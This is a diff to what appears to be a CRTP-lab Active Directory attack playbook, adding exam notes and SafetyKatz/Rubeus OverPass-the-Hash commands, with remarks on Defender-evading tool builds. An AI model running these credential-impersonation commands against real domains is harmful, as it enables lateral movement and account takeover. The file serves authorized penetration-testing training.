@@ -3,6 +3,19 @@
  Authorized CRTP lab / your own AD only.
 ================================================================
 
+EXAM NOTES (from the CRTP brief - read once):
+ * GOAL = OS command execution on ALL 5 targets (admin NOT required) + the final flag:
+     C:\Users\finadmin\Desktop\finalflag.txt   (on the DC)
+ * OverPass-the-Hash: use SafetyKatz (Rubeus OPtH was flaky). Loader/SafetyKatz in the
+   latest Tools.zip are updated to evade Defender - grab the newest versions.
+ * No dictionary brute-force is required - if a path needs cracking, there's another way.
+ * BloodHound: run only the collector in the lab; keep the GUI on your host.
+ * Some PS tools need .NET 3.5 and can be inconsistent - verify findings with a 2nd tool.
+ * REPORT (fail condition): write it in YOUR OWN WORDS and explain WHY each command works.
+   AI-generated report text is rejected. This script's files are a DOING aid to act fast,
+   NOT report content - do not paste EXPLOIT_COMMANDS/PLAYBOOK text into your report.
+================================================================
+
 ------------------------------------------------
 NOISE POSTURE (read this)
 ------------------------------------------------
@@ -96,7 +109,9 @@ AFTER LOCAL PRIVESC (became local admin / SYSTEM on a box)
 
  3) Become that new identity (THE key step), pick one:
         runas /netonly /user:<dom>\<user> powershell            (have password)
-        Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt         (overpass-the-hash)
+        SafetyKatz.exe "sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:powershell.exe"
+                                                                (OverPass-the-Hash - exam-preferred)
+        Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt         (OPtH alt; Rubeus was flaky in the exam)
 
  4) Re-enumerate AS that identity:
         # option A - in the runas/PTT shell, just run it (inherits the context):
